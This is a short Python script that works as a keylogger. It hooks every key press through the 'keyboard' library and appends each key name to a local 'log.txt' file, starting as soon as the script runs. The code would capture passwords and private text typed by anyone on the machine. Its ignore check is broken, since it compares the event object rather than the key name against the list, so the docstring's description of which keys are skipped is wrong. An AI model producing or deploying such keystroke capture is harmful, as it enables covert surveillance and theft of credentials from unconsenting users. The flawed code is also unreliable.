import keyboard


def when_press_the_key(key):
    """
    Callback function to handle keyboard events when a key is pressed.

    Parameters:
        key (keyboard.KeyboardEvent): The keyboard event object representing the key press.

    Returns:
        None

    Description:
        This function is intended to be used as a callback for the keyboard.on_press method.
        It logs the keys pressed into a file named 'log.txt', 
        ignoring certain keys specified in the keys_to_ignore list.
        The 'enter' key is logged as a new line, the 'space' key is logged as a space character, 
        and all other keys are logged as their names.

    Keys to Ignore:
        The following keys will not be logged:
        'alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift', 
        'win', 'caps lock', 'up', 'down', 'left', 'right',
        'insert', 'home', 'page up', 'page down', 'end', 'num lock', 
        'scroll lock', 'pause', 'print screen',
        'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'

    File Output:
        The logged keys are appended to the 'log.txt' file in the current directory.
        The file is opened in UTF-8 encoding to ensure compatibility with various characters.

    Example:
        keyboard.on_press(when_press_the_key)
        keyboard.wait()
    """

    keys_to_ignore = ['alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift', 'win', 'caps lock',
                      'up', 'down', 'left', 'right', 'insert', 'home', 'page up', 'page down',
                      'end', 'num lock', 'scroll lock', 'pause', 'print screen', 'f1', 'f2',
                      'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']

    with open('log.txt', 'a', encoding='utf-8') as log_file:
        if key not in keys_to_ignore:
            if key.name == 'enter':
                log_file.write('\n')
            elif key.name == 'space':
                log_file.write(' ')
            else:
                log_file.write(key.name)


keyboard.on_press(when_press_the_key)
keyboard.wait()
